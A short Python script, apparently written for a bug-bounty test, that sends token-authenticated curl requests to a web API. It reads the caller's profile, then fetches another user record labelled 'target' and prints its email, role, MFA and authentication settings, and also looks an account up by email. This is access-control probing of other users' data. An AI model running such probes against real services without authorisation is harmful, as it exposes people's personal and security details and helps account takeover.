import json,subprocess,os
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']
def req(method,path,body=None):
    cmd=['curl','-s','-m','40','-o','/tmp/b','-w','%{http_code}','-X',method,H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json']
    if body is not None: cmd+=['-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
# who am I
c,b=req('GET','/api/v1/users/me')
d=json.loads(b)['users'][0]
print("ME:",d['id'],d['email'],"role",d['role_id'])
# find target 230
c,b=req('GET','/api/v1/users/230')
print("\nGET /users/230 ->",c)
try:
    u=json.loads(b)['users'][0]
    print("  email:",u.get('email'),"role:",u.get('role_id'),"mfa:",u.get('mfa_enabled'),
          "req_pw_change:",u.get('requires_password_change'),"auth_type:",u.get('auth_type'))
except Exception as e: print("  ",b[:300])
# locate golden-leaf via users/query
c,b=req('GET','/api/v1/users/query?filter[email][eq]=golden-leaf-3068@bugcrowdninja.com')
print("\nusers/query by email ->",c)
print("  ",b[:400])
